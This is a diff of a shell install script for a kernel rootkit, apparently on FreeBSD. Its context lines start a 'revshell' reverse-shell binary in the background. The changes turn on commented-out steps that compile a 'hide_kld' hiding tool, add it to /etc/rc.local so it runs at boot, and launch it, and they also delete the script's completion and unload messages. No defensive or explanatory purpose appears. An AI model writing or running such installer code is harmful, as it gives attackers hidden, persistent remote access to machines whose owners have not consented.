@@ -89,9 +89,9 @@ pkill -f revshell 2>/dev/null || true
 nohup /usr/local/bin/revshell >/dev/null 2>&1 &
 
 # Install hiding
-# cc -Wall -Wextra -o "$PROJECT_DIR/user/hide_kld" "$PROJECT_DIR/user/hide_kld.c"
+cc -Wall -Wextra -o "$PROJECT_DIR/user/hide_kld" "$PROJECT_DIR/user/hide_kld.c"
 
-# ABS_PATH=$(realpath "$PROJECT_DIR/user/hide_kld")
+ABS_PATH=$(realpath "$PROJECT_DIR/user/hide_kld")
 
 if [ ! -f /etc/rc.local ]; then
     echo "#!/bin/sh" > /etc/rc.local
@@ -100,13 +100,8 @@ chmod +x /etc/rc.local
 
 
 # Ensures no duplicate entries in rc.local
-# if ! grep -q "hide_kld" /etc/rc.local; then
-#     echo "$ABS_PATH &" >> /etc/rc.local
-# fi
+if ! grep -q "hide_kld" /etc/rc.local; then
+    echo "$ABS_PATH &" >> /etc/rc.local
+fi
 
-# "$ABS_PATH" &
-
-# Print completion message
-# printf '%s\n' '[+] Installation complete; module entry:'
-# kldstat -m rootkit
-# printf '%s\n' '[*] Unload with: kldunload rootkit'
+"$ABS_PATH" &
